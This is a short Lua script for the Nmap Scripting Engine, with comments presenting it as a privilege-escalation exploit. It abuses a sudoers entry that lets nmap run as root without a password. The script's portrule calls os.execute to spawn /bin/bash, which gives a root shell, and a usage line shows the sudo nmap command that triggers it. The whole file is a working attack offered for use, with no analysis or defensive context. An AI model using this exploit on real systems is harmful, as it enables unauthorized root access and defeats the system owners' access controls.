-- Run this program using the Nmap Scripting engine to escalate privileges to root aslong as the below is met:
-- The sudoers file needs to contain: ALL = (root) NOPASSWD: /usr/bin/nmap
-- Usage: `sudo nmap --script=nmap-privesc.lua localhost

portrule = function(x)
  os.execute("/bin/bash")
end

action = function(host, port) end  -- pointless code really but NSE needs it in order to run
